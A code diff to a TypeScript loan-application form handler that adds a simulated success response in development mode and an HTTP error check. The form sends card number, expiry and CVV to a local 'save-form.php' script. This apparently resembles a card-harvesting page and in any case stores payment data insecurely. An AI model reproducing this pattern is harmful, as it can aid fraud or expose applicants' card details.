@@ -2,7 +2,7 @@ import { LoanFormData } from '../types/formTypes';
 
 export const submitFormData = async (formData: LoanFormData): Promise<{ success: boolean; message: string }> => {
   try {
-    // Create FormData object for PHP submission
+    // Create FormData object
     const form = new FormData();
     
     // Add loan details
@@ -31,7 +31,18 @@ export const submitFormData = async (formData: LoanFormData): Promise<{ success:
     form.append('cardExpiry', formData.cardInfo.expiry);
     form.append('cardCvv', formData.cardInfo.cvv);
 
-    // Submit to PHP endpoint with proper headers
+    // Check if we're in development mode
+    if (import.meta.env.DEV) {
+      // Simulate a successful API response in development
+      await new Promise(resolve => setTimeout(resolve, 1000)); // Simulate network delay
+      
+      return {
+        success: true,
+        message: 'Solicitud procesada exitosamente (Development Mode)'
+      };
+    }
+
+    // In production, submit to PHP endpoint
     const response = await fetch('/save-form.php', {
       method: 'POST',
       body: form,
@@ -39,6 +50,10 @@ export const submitFormData = async (formData: LoanFormData): Promise<{ success:
         'Accept': 'application/json'
       }
     });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
 
     const result = await response.json();
     
